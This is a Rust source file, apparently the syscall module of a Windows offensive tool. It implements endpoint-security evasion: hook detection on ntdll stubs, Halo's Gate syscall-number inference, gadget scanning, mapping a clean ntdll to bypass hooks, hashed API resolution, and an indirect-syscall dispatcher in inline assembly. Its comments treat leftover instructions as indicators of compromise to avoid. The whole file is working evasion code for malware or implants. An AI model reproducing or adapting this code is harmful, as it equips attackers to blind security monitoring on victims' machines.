    #[cfg(not(target_arch = "x86_64"))]
    const MODULE_INFO_SIZE: usize = 304; // TODO: verify on aarch64

    // RTL_PROCESS_MODULES layout:
    //   ULONG NumberOfModules           (4 bytes)
    //   ULONG padding                   (4 bytes on x64)
    //   RTL_PROCESS_MODULE_INFORMATION Modules[1]
    let first_module_offset = 8; // After NumberOfModules (4) + padding (4)

    // Compile-time sanity check: the struct must match the kernel ABI.
    #[cfg(target_arch = "x86_64")]
    const _: () = assert!(
        std::mem::size_of::<RtlProcessModuleInformation>() == 304,
        "RtlProcessModuleInformation size mismatch"
    );

    if first_module_offset + MODULE_INFO_SIZE > buf.len() {
        return None;
    }

    // The first module is typically the kernel (ntoskrnl.exe).
    // ImageBase is at struct offset 0x18 (24) on x64.
    #[cfg(target_arch = "x86_64")]
    let image_base_off = first_module_offset + 24;
    #[cfg(not(target_arch = "x86_64"))]
    let image_base_off = first_module_offset + 16;
    if image_base_off + 8 > buf.len() {
        return None;
    }
    let kernel_base =
        usize::from_le_bytes(buf[image_base_off..image_base_off + 8].try_into().ok()?);

    // Verify it's the kernel by checking the name.
    // OffsetToFileName is at struct offset 0x2E (46) on x64.
    #[cfg(target_arch = "x86_64")]
    let name_offset_field_off = first_module_offset + 46;
    #[cfg(not(target_arch = "x86_64"))]
    let name_offset_field_off = first_module_offset + 38;
    // FullPathName array starts at struct offset 0x30 (48) on x64.
    #[cfg(target_arch = "x86_64")]
    let full_path_name_off = first_module_offset + 48;
    #[cfg(not(target_arch = "x86_64"))]
    let full_path_name_off = first_module_offset + 40;

    if full_path_name_off + 256 > buf.len() {
        return Some(kernel_base); // Trust it without name verification.
    }
    let file_name_offset = u16::from_le_bytes(
        buf[name_offset_field_off..name_offset_field_off + 2]
            .try_into()
            .unwrap_or([0; 2]),
    ) as usize;
    let name_start = full_path_name_off + file_name_offset;
    if name_start + 12 <= buf.len() {
        let name = &buf[name_start..];
        // Check for "ntoskrnl.exe" (case-insensitive).
        if name.starts_with(b"ntoskrnl") || name.starts_with(b"NTOSKRNL") {
            log::debug!("nt_syscall: kernel base confirmed from module name");
        }
    }

    Some(kernel_base)
}

// ─── Hook-byte detection & stub parsing ────────────────────────────────────

/// Attempt to extract the SSN and gadget address directly from an unhooked
/// `Nt*` stub at `func_addr` (x86-64).  Returns `None` when the stub appears
/// hooked (no `syscall` instruction found within the first 64 bytes).
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
    let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
    for j in 0..bytes.len().saturating_sub(1) {
        if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
            for k in (0..j).rev() {
                if bytes[k] == 0xb8 && k + 5 <= bytes.len() {
                    let ssn = u32::from_le_bytes(bytes[k + 1..k + 5].try_into().unwrap());
                    return Some(SyscallTarget {
                        ssn,
                        gadget_addr: func_addr + j,
                    });
                }
            }
        }
    }
    None
}

/// Scan up to 16 ARM64 instructions of an `Nt*` stub looking for `svc #0`
/// (0xD4000001), then search backward for `movz x8, #imm16` to extract SSN.
#[cfg(all(windows, target_arch = "aarch64"))]
unsafe fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
    let words = std::slice::from_raw_parts(func_addr as *const u32, 16);
    for j in 0..words.len() {
        if words[j] == 0xD4000001 {
            // svc #0 found — search backward for movz x8 / movk x8.
            let mut ssn: u32 = 0;
            let mut found_movz = false;
            for k in (0..j).rev() {
                let w = words[k];
                if (w & 0xFFE0001F) == 0xF2A00008 {
                    // movk x8, #imm16, lsl #16
                    let imm16 = ((w >> 5) & 0xFFFF) as u32;
                    ssn |= imm16 << 16;
                } else if (w & 0xFFE0001F) == 0xD2800008 {
                    // movz x8, #imm16
                    let imm16 = ((w >> 5) & 0xFFFF) as u32;
                    ssn = (ssn & 0xFFFF0000) | imm16;
                    found_movz = true;
                    break;
                }
            }
            if found_movz {
                return Some(SyscallTarget {
                    ssn,
                    gadget_addr: func_addr + j * 4,
                });
            }
        }
    }
    None
}

/// Validate that a gadget at `addr` of `len` bytes is safe to execute:
///   1. The region is committed and executable.
///   2. The gadget does not straddle a 4 KiB page boundary.
#[cfg(windows)]
unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
    use winapi::um::memoryapi::VirtualQuery;
    use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT};

    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    if VirtualQuery(
        addr as *const _,
        &mut mbi,
        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
    ) == 0
    {
        return false;
    }
    if mbi.State != MEM_COMMIT {
        return false;
    }
    const PAGE_EXECUTE: u32 = 0x10;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
    let prot = mbi.Protect;
    if prot != PAGE_EXECUTE
        && prot != PAGE_EXECUTE_READ
        && prot != PAGE_EXECUTE_READWRITE
        && prot != PAGE_EXECUTE_WRITECOPY
    {
        return false;
    }
    let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
    if addr + len > region_end {
        return false;
    }
    let page_start = addr & !0xFFF;
    addr + len <= page_start + 0x1000
}

/// Collect virtual addresses of all `Nt`-prefixed exports from `module_base`.
#[cfg(windows)]
unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64};

    let dos = &*(module_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return Vec::new();
    }
    let nt = &*((module_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let export_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    let export_size = nt.OptionalHeader.DataDirectory[0].Size as usize;
    if export_rva == 0 || export_size == 0 {
        return Vec::new();
    }

    let dir = &*((module_base + export_rva) as *const IMAGE_EXPORT_DIRECTORY);
    let n_names = dir.NumberOfNames as usize;
    if n_names == 0 {
        return Vec::new();
    }

    let name_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNames as usize) as *const u32,
        n_names,
    );
    let ordinals = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNameOrdinals as usize) as *const u16,
        n_names,
    );
    let func_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfFunctions as usize) as *const u32,
        dir.NumberOfFunctions as usize,
    );

    let mut result = Vec::new();
    for i in 0..n_names {
        let name_ptr = (module_base + name_rvas[i] as usize) as *const u8;
        if *name_ptr != b'N' || *name_ptr.add(1) != b't' {
            continue;
        }
        if !(*name_ptr.add(2)).is_ascii_uppercase() {
            continue;
        }
        let ord = ordinals[i] as usize;
        if ord >= func_rvas.len() {
            continue;
        }
        let func_rva = func_rvas[ord] as usize;
        if func_rva >= export_rva && func_rva < export_rva + export_size {
            continue; // forwarded
        }
        result.push(module_base + func_rva);
    }
    result
}

/// Halo's Gate: infer `target_addr`'s SSN from parseable neighbours.
#[cfg(windows)]
unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<SyscallTarget> {
    let mut vas = collect_nt_export_vas(ntdll_base);
    if vas.is_empty() {
        return None;
    }
    vas.sort_unstable();

    let target_idx = vas.iter().position(|&va| va == target_addr)?;

    const MAX_DELTA: usize = 8;
    for delta in 1..=MAX_DELTA {
        if let Some(&upper_va) = vas.get(target_idx + delta) {
            if let Some(t) = parse_syscall_stub(upper_va) {
                if let Some(inferred) = t.ssn.checked_sub(delta as u32) {
                    log::debug!(
                        "nt_syscall::halo_gate: SSN {} inferred for {:#x} (upper+{})",
                        inferred,
                        target_addr,
                        delta
                    );
                    return Some(SyscallTarget {
                        ssn: inferred,
                        gadget_addr: t.gadget_addr,
                    });
                }
            }
        }
        if delta <= target_idx {
            if let Some(t) = parse_syscall_stub(vas[target_idx - delta]) {
                let inferred = t.ssn + delta as u32;
                log::debug!(
                    "nt_syscall::halo_gate: SSN {} inferred for {:#x} (lower-{})",
                    inferred,
                    target_addr,
                    delta
                );
                return Some(SyscallTarget {
                    ssn: inferred,
                    gadget_addr: t.gadget_addr,
                });
            }
        }
    }
    log::warn!(
        "nt_syscall::halo_gate: could not infer SSN for {:#x} within {} neighbours",
        target_addr,
        MAX_DELTA
    );
    None
}

/// Scan the loaded ntdll `.text` section for a valid `syscall; ret` gadget
/// (x86-64).  Returns the gadget's address, or `None` if none was found.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let p_sections = (nt as *const _ as usize
        + 4
        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
        + nt.FileHeader.SizeOfOptionalHeader as usize)
        as *const IMAGE_SECTION_HEADER;

    for i in 0..nt.FileHeader.NumberOfSections {
        let section = &*p_sections.add(i as usize);
        let name = &section.Name;
        if name[0] == b'.'
            && name[1] == b't'
            && name[2] == b'e'
            && name[3] == b'x'
            && name[4] == b't'
        {
            let start = ntdll_base + section.VirtualAddress as usize;
            let size = *section.Misc.VirtualSize() as usize;
            let code = std::slice::from_raw_parts(start as *const u8, size);
            for j in 0..size.saturating_sub(3) {
                if code[j] == 0x0f && code[j + 1] == 0x05 {
                    let candidate = start + j;
                    let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
                    if gadget_is_valid(candidate, gadget_len) {
                        return Some(candidate);
                    }
                }
            }
            break;
        }
    }
    None
}

/// Scan the loaded ntdll `.text` section for a valid `svc #0; ret` (or bare
/// `svc #0`) gadget on ARM64 Windows.  ARM64 uses fixed-width 32-bit
/// instructions, so the scan walks in 4-byte (u32) steps.
#[cfg(all(windows, target_arch = "aarch64"))]
unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let p_sections = (nt as *const _ as usize
        + 4
        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
        + nt.FileHeader.SizeOfOptionalHeader as usize)
        as *const IMAGE_SECTION_HEADER;

    for i in 0..nt.FileHeader.NumberOfSections {
        let section = &*p_sections.add(i as usize);
        let name = &section.Name;
        if name[0] == b'.'
            && name[1] == b't'
            && name[2] == b'e'
            && name[3] == b'x'
            && name[4] == b't'
        {
            let start = ntdll_base + section.VirtualAddress as usize;
            let size = *section.Misc.VirtualSize() as usize;
            let n_words = size / 4;
            let words = std::slice::from_raw_parts(start as *const u32, n_words);
            for j in 0..n_words {
                if words[j] == 0xD4000001 {
                    // svc #0
                    let candidate = start + j * 4;
                    let gadget_len = if j + 1 < n_words && words[j + 1] == 0xD65F03C0 {
                        8
                    } else {
                        4
                    };
                    if gadget_is_valid(candidate, gadget_len) {
                        return Some(candidate);
                    }
                }
            }
            break;
        }
    }
    None
}

/// Bootstrap SSN resolution (x86-64): inspect prologue bytes for hook
/// detection, then use Halo's Gate for SSN and a `.text` scan for the gadget.
#[cfg(all(windows, target_arch = "x86_64"))]
fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
    unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;

        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
        let is_hooked = !((prologue[0] == 0x4C && prologue[1] == 0x8B) || prologue[0] == 0xB8);

        if !is_hooked {
            if let Some(t) = parse_syscall_stub(func_addr) {
                return Some(t);
            }
        } else {
            log::warn!(
                "nt_syscall: {func_name} stub appears hooked \
                 (prologue: {:#04x} {:#04x}); using Halo's Gate + .text gadget scan",
                prologue[0],
                prologue[1]
            );
        }

        let ssn_target = match infer_ssn_halo_gate(ntdll_base, func_addr) {
            Some(t) => t,
            None => {
                log::warn!(
                    "nt_syscall: Halo's Gate failed for {func_name} \
                     (all adjacent stubs hooked); invoking ntdll unhook fallback"
                );
                if let Some(callback) = UNHOOK_CALLBACK.get() {
                    if callback() {
                        if let Some(cache) = SYSCALL_CACHE.get() {
                            cache.lock().unwrap().remove(func_name);
                        }
                        log::info!(
                            "nt_syscall: ntdll unhook succeeded, retrying SSN for {func_name}"
                        );
                        let ntdll_base2 =
                            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
                        let func_addr2 =
                            pe_resolve::get_proc_address_by_hash(ntdll_base2, target_hash)?;
                        if let Some(t) = parse_syscall_stub(func_addr2) {
                            return Some(t);
                        }
                        infer_ssn_halo_gate(ntdll_base2, func_addr2)?
                    } else {
                        log::error!("nt_syscall: ntdll unhook callback failed for {func_name}");
                        return None;
                    }
                } else {
                    log::error!(
                        "nt_syscall: Halo's Gate failed for {func_name} \
                         and no unhook callback is registered"
                    );
                    return None;
                }
            }
        };

        if is_hooked {
            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
                return Some(SyscallTarget {
                    ssn: ssn_target.ssn,
                    gadget_addr,
                });
            }
            log::warn!(
                "nt_syscall: {func_name}: no clean gadget found in .text; \
                 using Halo's Gate neighbour gadget as fallback"
            );
        }

        Some(ssn_target)
    }
}

/// Bootstrap SSN resolution (ARM64): inspect the first instruction for hook
/// detection.  An unhooked ARM64 Nt* stub starts with `movz x8, #imm16`
/// (opcode mask 0xFFE0001F == 0xD2800008).  A hooked stub typically begins
/// with a branch instruction (`b <offset>` or `br xN`).
#[cfg(all(windows, target_arch = "aarch64"))]
fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
    unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;

        let first_word = std::ptr::read_unaligned(func_addr as *const u32);
        let is_hooked = (first_word & 0xFFE0001F) != 0xD2800008;

        if !is_hooked {
            if let Some(t) = parse_syscall_stub(func_addr) {
                return Some(t);
            }
        } else {
            log::warn!(
                "nt_syscall: {func_name} stub appears hooked \
                 (first instruction: {:#010x}); using Halo's Gate + .text gadget scan",
                first_word
            );
        }

        let ssn_target = match infer_ssn_halo_gate(ntdll_base, func_addr) {
            Some(t) => t,
            None => {
                log::warn!(
                    "nt_syscall: Halo's Gate failed for {func_name} \
                     (all adjacent stubs hooked); invoking ntdll unhook fallback"
                );
                if let Some(callback) = UNHOOK_CALLBACK.get() {
                    if callback() {
                        if let Some(cache) = SYSCALL_CACHE.get() {
                            cache.lock().unwrap().remove(func_name);
                        }
                        log::info!(
                            "nt_syscall: ntdll unhook succeeded, retrying SSN for {func_name}"
                        );
                        let ntdll_base2 =
                            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
                        let func_addr2 =
                            pe_resolve::get_proc_address_by_hash(ntdll_base2, target_hash)?;
                        if let Some(t) = parse_syscall_stub(func_addr2) {
                            return Some(t);
                        }
                        infer_ssn_halo_gate(ntdll_base2, func_addr2)?
                    } else {
                        log::error!("nt_syscall: ntdll unhook callback failed for {func_name}");
                        return None;
                    }
                } else {
                    log::error!(
                        "nt_syscall: Halo's Gate failed for {func_name} \
                         and no unhook callback is registered"
                    );
                    return None;
                }
            }
        };

        if is_hooked {
            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
                return Some(SyscallTarget {
                    ssn: ssn_target.ssn,
                    gadget_addr,
                });
            }
            log::warn!(
                "nt_syscall: {func_name}: no clean svc #0 gadget found in .text; \
                 using Halo's Gate neighbour gadget as fallback"
            );
        }

        Some(ssn_target)
    }
}

// ─── Clean ntdll mapping ───────────────────────────────────────────────────

/// Map a read-only file-backed copy of ntdll.dll from disk using bootstrap
/// syscalls (Halo's Gate).  Returns the base address of the mapping.
fn map_clean_ntdll() -> anyhow::Result<usize> {
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let sys_open = get_bootstrap_ssn("NtOpenFile")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtOpenFile"))?;
    let sys_section = get_bootstrap_ssn("NtCreateSection")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtCreateSection"))?;
    let sys_map = get_bootstrap_ssn("NtMapViewOfSection")
        .ok_or_else(|| anyhow!("nt_syscall: no SSN for NtMapViewOfSection"))?;

    let gadget = sys_open.gadget_addr; // use first resolved gadget throughout

    let mut ntdll_path: Vec<u16> = format!(r"\??\{}\System32\ntdll.dll", sysroot)
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((ntdll_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (ntdll_path.len() * 2) as u16;
        obj_name.Buffer = ntdll_path.as_mut_ptr();

        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

        let mut io_status = [0u64; 2];
        let mut h_file: *mut winapi::ctypes::c_void = std::ptr::null_mut();

        let s = do_syscall(
            sys_open.ssn,
            gadget,
            &[
                &mut h_file as *mut _ as u64,
                0x80100000u64, // SYNCHRONIZE | FILE_READ_DATA
                &mut obj_attr as *mut _ as u64,
                io_status.as_mut_ptr() as u64,
                1u64,    // FILE_SHARE_READ
                0x20u64, // FILE_SYNCHRONOUS_IO_NONALERT
            ],
        );
        if s < 0 {
            return Err(anyhow!(
                "nt_syscall: NtOpenFile(ntdll) NTSTATUS {:#010x}",
                s as u32
            ));
        }

        let mut h_section: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let s = do_syscall(
            sys_section.ssn,
            gadget,
            &[
                &mut h_section as *mut _ as u64,
                0x000F_001Fu64, // SECTION_ALL_ACCESS
                0u64,
                0u64,
                0x20u64,        // PAGE_EXECUTE_READ
                0x0100_0000u64, // SEC_IMAGE
                h_file as u64,
            ],
        );
        pe_resolve::close_handle(h_file as *mut core::ffi::c_void);
        if s < 0 {
            return Err(anyhow!(
                "nt_syscall: NtCreateSection(ntdll) NTSTATUS {:#010x}",
                s as u32
            ));
        }

        let mut base_addr: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;
        let s = do_syscall(
            sys_map.ssn,
            gadget,
            &[
                h_section as u64,
                (-1isize) as u64, // NtCurrentProcess()
                &mut base_addr as *mut _ as u64,
                0u64,
                0u64,
                0u64,
                &mut view_size as *mut _ as u64,
                1u64, // ViewShare
                0u64,
                0x20u64, // PAGE_EXECUTE_READ
            ],
        );
        pe_resolve::close_handle(h_section as *mut core::ffi::c_void);
        if s < 0 || base_addr.is_null() {
            return Err(anyhow!(
                "nt_syscall: NtMapViewOfSection(ntdll) NTSTATUS {:#010x}",
                s as u32
            ));
        }

        Ok(base_addr as usize)
    }
}

// ─── Public SSN resolution API ─────────────────────────────────────────────

/// Read the SSN from a named export in the clean-mapped ntdll at `base`.
unsafe fn read_export_ssn(base: usize, func_name: &str) -> anyhow::Result<SyscallTarget> {
    let mut name = func_name.as_bytes().to_vec();
    name.push(0);
    let hash = pe_resolve::hash_str(&name);
    let func_addr = pe_resolve::get_proc_address_by_hash(base, hash)
        .ok_or_else(|| anyhow!("nt_syscall: {} not found in clean ntdll", func_name))?;
    parse_syscall_stub(func_addr)
        .ok_or_else(|| anyhow!("nt_syscall: could not parse SSN for {}", func_name))
}

/// Initialise the syscall infrastructure: map a clean copy of ntdll.dll and
/// warm up the SSN cache.  Safe to call multiple times; subsequent calls are
/// no-ops.
///
/// Returns `Ok(())` on success.  On failure the crate degrades gracefully to
/// bootstrap-mode resolution (Halo's Gate against the loaded ntdll).
pub fn init_syscall_infrastructure() -> anyhow::Result<()> {
    // If cache was dirtied, we need to re-map.  Now that CLEAN_NTDLL is a
    // RwLock<Option<usize>>, we can actually reset it and re-map.
    if CACHE_DIRTY.load(Ordering::Acquire) {
        CACHE_DIRTY.store(false, Ordering::Release);
        log::debug!("nt_syscall: cache was dirty — clearing flag and attempting re-map");
    }

    match map_clean_ntdll() {
        Ok(base) => {
            // Capture the PE timestamp for cross-reference validation.
            let ts = unsafe { read_pe_timestamp(base) };
            CACHED_TIMESTAMP.store(ts, Ordering::Release);

            if let Ok(mut guard) = CLEAN_NTDLL.write() {
                *guard = Some(base);
            }

            // Also cache the build number while we're at it.
            let _ = get_build_number();

            log::debug!(
                "nt_syscall: clean ntdll mapped at {:#x} (timestamp={:#010x}, build={})",
                base,
                ts,
                BUILD_NUMBER.load(Ordering::Acquire)
            );
            Ok(())
        }
        Err(e) => {
            log::warn!(
                "nt_syscall: clean ntdll mapping failed: {e}; falling back to bootstrap mode"
            );
            Err(e)
        }
    }
}

/// Resolve the SSN and gadget address for `func_name`.
///
/// Resolution order:
/// 1. Per-session cache (fast path).
/// 2. Clean-mapped ntdll (if [`init_syscall_infrastructure`] succeeded).
/// 3. Bootstrap / Halo's Gate against the loaded (potentially hooked) ntdll.
pub fn get_syscall_id(func_name: &str) -> anyhow::Result<SyscallTarget> {
    let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));

    // Fast path: check cache.
    if let Some(&(ssn, gadget_addr, _ts)) = cache.lock().unwrap().get(func_name) {
        return Ok(SyscallTarget { ssn, gadget_addr });
    }

    // Resolution order: clean ntdll → bootstrap → SSDT fallback.
    let clean_base = CLEAN_NTDLL.read().ok().and_then(|g| *g).filter(|&b| b != 0);
    let target = match clean_base {
        Some(base) => unsafe { read_export_ssn(base, func_name) }?,
        None => get_bootstrap_ssn(func_name).ok_or_else(|| {
            anyhow!("nt_syscall: bootstrap SSN resolution failed for '{func_name}'")
        })?,
    };

    // Validate against versioned SSN range table.
    let build = get_build_number();
    if build != 0 {
        if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
            if target.ssn < lo || target.ssn > hi {
                log::warn!(
                    "nt_syscall: resolved {} SSN={} is outside expected range [{},{}] for build {}; \
                     attempting SSDT fallback",
                    func_name, target.ssn, lo, hi, build
                );
                // Try SSDT fallback for this specific syscall.
                if let Some(ssdt_target) = unsafe { resolve_via_ssdt(func_name) } {
                    cache.lock().unwrap().insert(
                        func_name.to_string(),
                        (
                            ssdt_target.ssn,
                            ssdt_target.gadget_addr,
                            CACHED_TIMESTAMP.load(Ordering::Acquire),
                        ),
                    );
                    return Ok(ssdt_target);
                }
                // SSDT failed too — use what we have but log a warning.
                log::warn!(
                    "nt_syscall: SSDT fallback failed; using resolved SSN despite range mismatch"
                );
            }
        }
    }

    cache.lock().unwrap().insert(
        func_name.to_string(),
        (
            target.ssn,
            target.gadget_addr,
            CACHED_TIMESTAMP.load(Ordering::Acquire),
        ),
    );
    Ok(target)
}

// ─── Syscall dispatcher ────────────────────────────────────────────────────

/// Dispatch a Windows NT system call directly via the `syscall` instruction,
/// bypassing potentially hooked ntdll stubs.
///
/// # Safety
///
/// All argument values must be valid for the target NT function.  `ssn` and
/// `gadget_addr` must have been obtained from [`get_syscall_id`].
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
    #[cfg(target_arch = "x86_64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let stack_args: &[u64] = if args.len() > 4 { &args[4..] } else { &[] };
        let nstack: usize = stack_args.len();
        let stack_ptr: *const u64 = stack_args.as_ptr();
        let status: i32;

        core::arch::asm!(
            // Save RSP; restore after the call.
            "mov r14, rsp",
            // Allocate 0x20 shadow space + stack args (8 bytes each), aligned.
            "mov rax, rcx",
            "shl rax, 3",
            "add rax, 0x20 + 15",
            "and rax, -16",
            "sub rsp, rax",
            // Copy stack arguments into [rsp+0x20 .. rsp+0x20 + nstack*8].
            "test rcx, rcx",
            "jz 2f",
            "lea rdi, [rsp + 0x20]",
            "cld",
            "rep movsq",
            "2:",
            // Load syscall arguments and number.
            "mov rcx, {a1}",
            "mov rdx, {a2}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov r11, {gadget}",
            // Indirect syscall: call the `syscall; ret` gadget inside ntdll.
            "call r11",
            // Restore stack.
            "mov rsp, r14",
            ssn    = in(reg) ssn,
            gadget = in(reg) gadget_addr,
            inout("rcx") nstack => _,
            inout("rsi") stack_ptr => _,
            a1 = in(reg) a1,
            a2 = in(reg) a2,
            inlateout("r8")  a3 => _,
            inlateout("r9")  a4 => _,
            lateout("rax") status,
            out("rdx") _, out("r10") _, out("r11") _,
            out("r14") _, out("r15") _,
            out("rdi") _,
        );

        status
    }
    #[cfg(target_arch = "aarch64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let a5 = args.get(4).copied().unwrap_or(0);
        let a6 = args.get(5).copied().unwrap_or(0);
        let a7 = args.get(6).copied().unwrap_or(0);
        let a8 = args.get(7).copied().unwrap_or(0);

        if gadget_addr != 0 {
            // Indirect call: branch to a `svc #0; ret` gadget inside ntdll
            // so that no `svc` instruction exists in this crate's code pages.
            // `blr` stores the return address in x30 (LR); the gadget's
            // trailing `ret` uses x30 to return here.
            let status: i32;
            core::arch::asm!(
                "mov x8, {ssn}",
                "mov x0, {a1}",
                "mov x1, {a2}",
                "mov x2, {a3}",
                "mov x3, {a4}",
                "mov x4, {a5}",
                "mov x5, {a6}",
                "mov x6, {a7}",
                "mov x7, {a8}",
                "blr {gadget}",
                // Copy 32-bit NTSTATUS from w0 to output register.
                "mov {status:w}, w0",
                ssn = in(reg) ssn as u64,
                a1 = in(reg) a1, a2 = in(reg) a2,
                a3 = in(reg) a3, a4 = in(reg) a4,
                a5 = in(reg) a5, a6 = in(reg) a6,
                a7 = in(reg) a7, a8 = in(reg) a8,
                gadget = in(reg) gadget_addr as u64,
                status = out(reg) status,
                out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
                out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
                out("x8")  _,
                out("x9")  _, out("x10") _, out("x11") _,
                out("x12") _, out("x13") _, out("x14") _, out("x15") _,
                out("x16") _, out("x17") _,
                out("x30") _,
            );
            status
        } else {
            // Direct fallback: no gadget available (e.g. bootstrap mode).
            // This leaves a `svc` instruction in the binary — a potential IoC —
            // but is functionally correct.
            let status: i32;
            core::arch::asm!(
                "mov x8, {ssn}",
                "mov x0, {a1}",
                "mov x1, {a2}",
                "mov x2, {a3}",
                "mov x3, {a4}",
                "mov x4, {a5}",
                "mov x5, {a6}",
                "mov x6, {a7}",
                "mov x7, {a8}",
                "svc #0",
                ssn = in(reg) ssn as u64,
                a1 = in(reg) a1, a2 = in(reg) a2,
                a3 = in(reg) a3, a4 = in(reg) a4,
                a5 = in(reg) a5, a6 = in(reg) a6,
                a7 = in(reg) a7, a8 = in(reg) a8,
                lateout("x0") status,
                out("x8") _,
            );
            status
        }
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        let _ = (ssn, gadget_addr, args);
        // Unsupported architecture; return STATUS_NOT_IMPLEMENTED.
        0xC000_0002u32 as i32
    }
}

// ─── Public macro ──────────────────────────────────────────────────────────

/// Dispatch an NT system call by name.
///
/// Resolves the SSN and gadget address via [`get_syscall_id`] (with caching),
/// then calls [`do_syscall`] with the provided arguments cast to `u64`.
///
/// Returns `Result<i32>` — `Ok(ntstatus)` on a successful SSN lookup, or an
/// `Err` if the function name cannot be resolved.  A negative NTSTATUS in the
/// `Ok` variant indicates that the kernel call itself failed; callers should
/// check `result < 0` for NT-level errors.
///
/// # Example
///
/// ```rust,ignore
/// let status = nt_syscall::syscall!(
///     "NtAllocateVirtualMemory",
///     h_process, &mut base as *mut _ as u64,
///     0u64, &mut size as *mut _ as u64,
///     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
/// )?;
/// if status < 0 { return Err(anyhow!("NtAllocateVirtualMemory failed")); }
/// ```
#[macro_export]
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {
        $crate::get_syscall_id($func_name).map(|__target| {
            let __args: &[u64] = &[$($args as u64),*];
            unsafe { $crate::do_syscall(__target.ssn, __target.gadget_addr, __args) }
        })
    };
}
